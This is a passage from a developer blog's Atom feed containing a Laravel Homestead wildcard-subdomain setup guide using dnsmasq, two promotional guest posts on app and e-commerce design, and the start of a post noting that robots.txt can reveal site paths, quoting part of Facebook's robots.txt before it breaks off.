    <content type="html"><![CDATA[<p>Before start, you need to <a href="/blog/2015/10/31/vagrant-for-php-development-environment/">setup vagrant</a> and ssh into the virtual machine</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>vagrant up</span><br><span class="line"><span class="variable">$ </span>vagrant ssh</span><br></pre></td></tr></table></figure><h2 id="1-Edit-your-Nginx-config"><a href="#1-Edit-your-Nginx-config" class="headerlink" title="1. Edit your Nginx config"></a>1. Edit your Nginx config</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-available/</span>laravel.app</span><br></pre></td></tr></table></figure><p>In the <strong>server_name</strong> there</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">server_name</span> laravel.app <span class="regexp">*.laravel.app</span>;</span><br></pre></td></tr></table></figure><h2 id="2-Install-dnsmasq-amp-configure"><a href="#2-Install-dnsmasq-amp-configure" class="headerlink" title="2. Install dnsmasq &amp; configure"></a>2. Install <code>dnsmasq</code> &amp; configure</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install dnsmasq</span><br></pre></td></tr></table></figure><p>Then edit the config file</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim <span class="regexp">/etc/</span>dnsmasq.conf</span><br></pre></td></tr></table></figure><p>Add in the following content</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">local</span><span class="operator">=/</span>laravel.app/</span><br><span class="line"><span class="attribute">domain</span><span class="operator">=</span>laravel.app</span><br><span class="line"></span><br><span class="line"><span class="attribute">address</span><span class="operator">=/</span>laravel.app/<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>Restart <strong>dnsmasq</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="regexp">/etc/i</span>nit.d/dnsmasq restart</span><br></pre></td></tr></table></figure><h2 id="3-Go-back-to-host-machine-I’m-using-OS-X-here"><a href="#3-Go-back-to-host-machine-I’m-using-OS-X-here" class="headerlink" title="3. Go back to host machine (I’m using OS X here)"></a>3. Go back to host machine <em>(I’m using OS X here)</em></h2><p><img src="/images/posts/2015-12-01-setup-wildcard-subdomain-in-laravel-homestead/network-preference-1.png" alt="open network preference"></p><p>Open up the <strong>Network Preferences</strong></p><p><img src="/images/posts/2015-12-01-setup-wildcard-subdomain-in-laravel-homestead/network-preference-2.png" alt="Network preference - overview"></p><p>Click on the <strong>Advanced…</strong> tab</p><p><img src="/images/posts/2015-12-01-setup-wildcard-subdomain-in-laravel-homestead/network-preference-dns.png" alt="Network preference - DNS settings"></p><p>Now add these DNS to the settings, in the <strong>DNS</strong> tab</p><p><strong>NOTE: for 192.168.1.1, this you should follow your router address, because some may be 192.168.0.1 or others</strong></p><p>The <strong>/etc/hosts</strong> value would be</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>      laravel.app</span><br></pre></td></tr></table></figure><h2 id="4-Verify"><a href="#4-Verify" class="headerlink" title="4. Verify"></a>4. Verify</h2><p>Before that, double check your <strong>/etc/hosts</strong> in the host OS</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>      laravel.app</span><br></pre></td></tr></table></figure><p>Now you try to <strong>dig</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">dig</span> <span class="string">subdomain.laravel.app</span> <span class="string">@192.168.10.10</span></span><br><span class="line"></span><br><span class="line"><span class="string">;</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">DiG</span> <span class="number">9.8</span><span class="number">.3</span><span class="string">-P1</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">subdomain.laravel.app</span> <span class="string">@192.168.10.10</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">global options:</span> <span class="string">+cmd</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">Got answer:</span></span><br><span class="line"><span class="string">;;</span> <span class="string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="attr">opcode:</span> <span class="string">QUERY,</span> <span class="attr">status:</span> <span class="string">NOERROR,</span> <span class="attr">id:</span> <span class="number">62725</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">flags:</span> <span class="string">qr</span> <span class="string">aa</span> <span class="string">rd</span> <span class="string">ra;</span> <span class="attr">QUERY:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">ANSWER:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">AUTHORITY:</span> <span class="number">0</span><span class="string">,</span> <span class="attr">ADDITIONAL:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">QUESTION SECTION:</span></span><br><span class="line"><span class="string">;subdomain.laravel.app.</span>  <span class="string">IN</span>  <span class="string">A</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">ANSWER SECTION:</span></span><br><span class="line"><span class="string">subdomain.laravel.app.</span> <span class="number">0</span> <span class="string">IN</span>  <span class="string">A</span>   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">Query time:</span> <span class="number">11</span> <span class="string">msec</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">SERVER:</span> <span class="number">192.168</span><span class="number">.10</span><span class="number">.10</span><span class="comment">#53(192.168.10.10)</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">WHEN:</span> <span class="string">Mon</span> <span class="string">Nov</span> <span class="number">30</span> <span class="number">12</span><span class="string">:14:00</span> <span class="number">2015</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">MSG SIZE  rcvd:</span> <span class="number">62</span></span><br></pre></td></tr></table></figure><p>Now try in your browser, type in the address <a href="subdomain.laravel.app:8000">subdomain.laravel.app:8000</a></p><p><strong>NOTE:</strong></p><p>Sometime you may encounter a problem which it doesn’t work, so in this case you have to clear your DNS cache <em>(for OSX, <a href="https://support.apple.com/en-us/HT202516">refer here</a>)</em></p><p>References:</p><ul><li><a href="http://www.gufran.me/post/local-dns-server-with-vagrant-homestead/">Local Dns Server With Vagrant Homestead</a></li><li><a href="https://wiki.openwrt.org/doc/howto/dhcp.dnsmasq">OpenWrt: Dnsmasq</a></li><li><a href="http://passingcuriosity.com/2013/dnsmasq-dev-osx/">Using Dnsmasq for local development on OS X</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Before start, you need to &lt;a href=&quot;/blog/2015/10/31/vagrant-for-php-development-environment/&quot;&gt;setup vagrant&lt;/a&gt; and ssh into the virtual</summary>
        
      
    
    
    
    
    <category term="vagrant" scheme="http://jslim.net/tags/vagrant/"/>
    
    <category term="setup" scheme="http://jslim.net/tags/setup/"/>
    
  </entry>
  
  <entry>
    <title>Exploring The Factors That Can Lead To The Success Of An Application</title>
    <link href="http://jslim.net/blog/2015/11/26/exploring-the-factors-that-can-lead-to-the-success-of-an-application/"/>
    <id>http://jslim.net/blog/2015/11/26/exploring-the-factors-that-can-lead-to-the-success-of-an-application/</id>
    <published>2015-11-26T05:41:33.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Author Signature:</strong> <em>Addison Cohen is a mobile app developer working with Appsted Ltd. You can contact him if you want to <a href="http://www.appsted.com/hire-iphone-developers">hire iPhone app developer</a> for the development of the most comprehensive mobile application solutions. He loves sharing latest information on mobile technologies like iOS, Android development processes.</em></p><hr><p>The giant mobile marketplace already has a plethora of applications, and many more will release while I’m writing this article. Therefore, for the folks who want to make their application stand out in the pool of applications, a distinct app idea and a right approach are a must. </p><p>No matter what is the genre of application that you are interested in developing,  there are certain common factors that can lead to the success or failure of an application. Thus, by keeping the winning factors in mind, you can increase the likelihood of your app success in the market.</p><p><img src="/images/posts/2015-11-26-exploring-the-factors-that-can-lead-to-the-success-of-an-application/iphone.png" alt="Factor that lead to the success of an application"></p><p>Fortunately, there are many examples in the industry, who have committed mistakes while developing an application, from which you can learn and shun away the common mistakes. Here are some best practices that one must employ to ensure an intriguing and worthwhile application.</p><h3 id="1-Designing-is-the-Foundation-–-Don’t-overlook-it"><a href="#1-Designing-is-the-Foundation-–-Don’t-overlook-it" class="headerlink" title="1. Designing is the Foundation – Don’t overlook it!"></a>1. Designing is the Foundation – Don’t overlook it!</h3><p>For any type of application, design plays a pivotal role in its success. A poorly designed application won’t attract users. And, this is surely something that you won’t want to happen. For a well designed application, one must consider the four main steps. Let’s have a look into these steps.</p><p><strong>a.) Big Idea</strong> – The core idea behind the development of an application must be predefined, and addressed appropriately while designing the app. This idea must be something big and really useful. One may conduct several brainstorming sessions to come up with a valuable app idea.</p><p><strong>b.) Plan</strong> – Once the app idea is clear, it is essential to strategically think of a plan that can help you execute the app development process. Here you will decide whether you need to focus on various functions, or on a key feature.</p><p><strong>c.) Layout</strong> – Now, design the user interface by packaging the tangible products altogether to form a legible and impressive layout. Make sure that your design is simple and effective enough to entice users and encourage them to further interact with the application.</p><p><strong>d.) Functionality</strong> – Till this point, it can be assumed that half of the development task is done. Now, you must ensure that the integrated features are performing flawlessly to deliver a great user experience.</p><h3 id="2-Integrate-Features-that-are-in-vogue"><a href="#2-Integrate-Features-that-are-in-vogue" class="headerlink" title="2. Integrate Features that are in vogue.."></a>2. Integrate Features that are in vogue..</h3><p>Users, especially mobile device users tend to have a short attention span, and thus, they easily get distracted. For this reason it is advisable to integrate a few key features in your application, while ensuring that they work brilliantly. However, you can eventually upgrade the features with an increasing user base and requirements. Moreover, it is imperative to take care that whatever features you want to include in your app, they must deliver an absolute UX.</p><h3 id="3-Make-the-content-relevant-and-contextual"><a href="#3-Make-the-content-relevant-and-contextual" class="headerlink" title="3. Make the content relevant and contextual"></a>3. Make the content relevant and contextual</h3><p>While planning the content of an application, it is vital to ensure that all the information provided in your application is relevant and making sense to the users’ search. Concentrate on the key functionality of your application that is going to attract your potential users, and then think of additional features that are somehow contextual to the key feature. This can help you make your app go viral.</p><h3 id="4-Call-to-Action-should-be-instant-and-clear…"><a href="#4-Call-to-Action-should-be-instant-and-clear…" class="headerlink" title="4. Call to Action should be instant and clear…"></a>4. Call to Action should be instant and clear…</h3><p>If the app UI is making it confusing for users to decide where to click next, they might end up abandoning the application. Thus, the actions that you want your users to perform must be showcased in an attractive fashion. Your target users must be able to clearly see the CTA (Call to Action) buttons on a page. This will not only enhance the UX, but will also help you achieve your ultimate goal.</p><h3 id="5-Offer-notification-only-if-required"><a href="#5-Offer-notification-only-if-required" class="headerlink" title="5. Offer notification, only if required!"></a>5. Offer notification, only if required!</h3><p>The significance of notifications can’t be gainsaid. While notifications can augment the UX, they can also ruin the experience if they are included in apps that don’t demand such feature. Thus, it can be said that notifications are not advisable for every application. However, whenever they make sense, they must be added.</p><h3 id="6-Reap-the-benefits-of-Analytics"><a href="#6-Reap-the-benefits-of-Analytics" class="headerlink" title="6. Reap the benefits of Analytics.."></a>6. Reap the benefits of Analytics..</h3><p>The foremost benefit of integrating analytics in an application is that it lets one recognize the features, which are being neglected and which are being used by users. Having such insights can definitely help you iterate your app features to make it more useful. With robust analytics, you can identify the trends and instantly make suitable changes to further enhance the UX and elevate the application download rate.</p><h3 id="7-Offer-timely-and-localized-information"><a href="#7-Offer-timely-and-localized-information" class="headerlink" title="7. Offer timely and localized information"></a>7. Offer timely and localized information</h3><p>To make your application stand ahead the curve, you must offer the best features to your users. If you can deliver localized information in a timely way, it can amazingly boost the credibility of your application. For instance, let’s consider a news application. Apart from sharing regular headlines and news across the globe, if it can share news and happenings of the local area where you are at that moment, it will make the application more impressive and interesting. Thus, think out of the box and allow your application to take the benefits of location-based information by implementing the latest technologies like Beacon, Wi-Fi, GPS, etc., whichever is suitable for you.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Today, when truckloads of applications are already competing for their success in the wobbly mobile marketplace, it is not an easy pie to develop a successful application. However, by keeping a few essential factors in mind, one can surely heighten the app success rate. I hope the aforementioned factors will help you focus your application in the right direction.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;strong&gt;Author Signature:&lt;/strong&gt; &lt;em&gt;Addison Cohen is a mobile app developer working with Appsted Ltd. You can contact him if you want</summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Important Measures To Be Taken While Developing An E-commerce Site</title>
    <link href="http://jslim.net/blog/2015/11/26/important-measures-to-be-taken-while-developing-an-e-commerce-site/"/>
    <id>http://jslim.net/blog/2015/11/26/important-measures-to-be-taken-while-developing-an-e-commerce-site/</id>
    <published>2015-11-26T05:36:59.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Author Biography:</strong></p><p><em>This post is just arrived through the hard work of Samuel Dawson who is a expert <a href="http://www.designs2html.com/services/html-to-wordpress">HTML to WordPress</a> service provider. Samuel has refined here so many things on how you can build a impressive website just to start E Commerce business.</em></p><hr><p>Developing  an efficient ecommerce site from the scratch is not an easy task. There are various issues related to product designing process and product delivery systems with various website designing and marketing strategies.  With a multiple variety of online tools, it has become relatively easy to fetch and avail free and affordable resources that would surely help any ecommerce website shine across the world.</p><p>After certain decisions are made, next step is to develop an excellent online e-commerce shopping website. To develop a highly engaging e-commerce website, every possible element that serves a purpose of offering your customers with every proper e-commerce solutions is what you need to do for taking your e-commerce business at next step.</p><h3 id="1-Developing-an-e-commerce-site-with-website-with-crystal-clear-details-with-predictable-results-that-is-visually-appealing"><a href="#1-Developing-an-e-commerce-site-with-website-with-crystal-clear-details-with-predictable-results-that-is-visually-appealing" class="headerlink" title="1. Developing an e-commerce site with website with crystal clear details, with   predictable results that is visually appealing."></a>1. Developing an e-commerce site with website with crystal clear details, with   predictable results that is visually appealing.</h3><p>As said in various blogs or on various ecommerce website that a visitor must buy something. This makes your business to rise higher instantly by easily optimizing the sales part so that the path that leads to any visitor is heading towards right direction. </p><p><em>Some of the important steps that needs to be taken are as follows:-</em></p><ul><li>Call to action button follows the rule of accessing a transparent text with conspicuous design to engage visitors that would easily find what lies behind the scenes. An ultimate idea is to observe an overall design of the product that looks appealing enough to visitors to buy them with rapid rising results. </li><li>Navigation process and structures for developing various e-commerce websites define a clear, concise and high accuracy rates that refrains from duplicacy of common items such as About Us section. Another  important thing that falls into this category is that of Support and Help section that needs to be easily reachable for visitors</li><li>Next comes your Product with descriptions categories that offers a variety of different products as well as services with differentiating them in terms of various categories so that  visitors can get access to various information wherever they go. </li></ul><h3 id="2-Social-proof-is-what-customers-look-for"><a href="#2-Social-proof-is-what-customers-look-for" class="headerlink" title="2. Social proof is what customers look for"></a>2. Social proof is what customers look for</h3><p>Customers are extremely dependent upon public reviews that describes about a particular product as well as service and such is an obvious case with an online shopping mode. This is one of the reason why people frequently refer to third-party websites for multiple reviews. On the same side, if  reviews are brought into our own product page, it will prevent them from having second thought.</p><p>As published on the Wall Street Journal years ago, people respond better to peer level than to any financial incentives. The same thing is valid for digital world as well. In such cases, people will prefer to have more products because everyone is following the same pattern. This could be a message for everyone to send it by adding more users’ testimonial with expert reviews in your product pages.</p><h3 id="3-Thoroughly-follow-a-check-out-process-for-better-e-commerce-business"><a href="#3-Thoroughly-follow-a-check-out-process-for-better-e-commerce-business" class="headerlink" title="3. Thoroughly follow a check-out process for better e-commerce business"></a>3. Thoroughly follow a check-out process for better e-commerce business</h3><p>Creating a seamless checkout process definitely requires number of simple integration process for well-rated WordPress plugins. Its very obvious that if you want your customers to easily get back and forth from their shopping carts, then surely one needs to perform following steps:</p><ul><li>Minimizing the user data required to register and enable them to shop as they want it.</li><li>Allowing them to continue with shopping even if they’re in the middle of a checkout process, would be of great advatage while building new e-commerce site.</li><li>Displaying various related data with respect to shopping that includes subtotals, quantity of the product, etc.</li><li>Displaying a contact form and an open chat option will increase the number of  people for contact purpose at any time.</li></ul><h3 id="4-Secure-transactions-are-the-only-transactions"><a href="#4-Secure-transactions-are-the-only-transactions" class="headerlink" title="4. Secure transactions are the only transactions."></a>4. Secure transactions are the only transactions.</h3><p>Well in current days, almost each one of us are aware of various potential threats of online shopping that clearly defines that they are quite likely to abandon their shopping carts whatever way they feel for dealing with the payment process,  might not be secure enough.</p><p>One needs to make sure that in-order to validate a proper security measures, its quite essential to use proper websites features and potentially adds familiar security icon options and logos that will finally help shoppers feel more comfortable with transaction process.</p><h3 id="5-Build-relationships-but-exclude-social-site-buttons-from-product-pages"><a href="#5-Build-relationships-but-exclude-social-site-buttons-from-product-pages" class="headerlink" title="5. Build relationships but exclude social site buttons from product pages."></a>5. Build relationships but exclude social site buttons from product pages.</h3><p>As shown on the basis of several studies that most of the product pages are not dealing with shares that displays next to these buttons that are highly threatening because it might appear as a negative social thought that can obviously hamper your start-up e-commerce business.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;strong&gt;Author Biography:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This post is just arrived through the hard work of Samuel Dawson who is a expert &lt;a</summary>
        
      
    
    
    
    
    <category term="wordpress" scheme="http://jslim.net/tags/wordpress/"/>
    
    <category term="e-commerce" scheme="http://jslim.net/tags/e-commerce/"/>
    
  </entry>
  
  <entry>
    <title>robots.txt could be vulnerable</title>
    <link href="http://jslim.net/blog/2015/11/14/robots-dot-txt-could-be-vulnerable/"/>
    <id>http://jslim.net/blog/2015/11/14/robots-dot-txt-could-be-vulnerable/</id>
    <published>2015-11-14T19:26:20.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.robotstxt.org/">Robots.txt</a> designed to prevent search engine to crawl your page or content, some of the content probably you don’t want others to search about it.</p><p>Example, below shows that this site prevent all user agent <em>(mostly search engine)</em> to crawl the content of the entire site.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><p>However, this could be a loophole for giving a chance to hacker to hack into your site, because you have exposed the paths.</p><p>Take a look on <a href="https://www.facebook.com/robots.txt">Facebook’s robots.txt</a>, it is</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Notice: Crawling Facebook is prohibited unless you have express written</span></span><br><span class="line"><span class="meta"># permission. See: http:<span class="comment">//www.facebook.com/apps/site_scraping_tos_terms.php</span></span></span><br><span class="line"></span><br><span class="line">User-agent: baiduspider</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Bingbot</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Googlebot</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: ia_archiver</span><br><span class="line"><span class="symbol">Disallow:</span> /</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: msnbot</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Naverbot</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: seznambot</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span 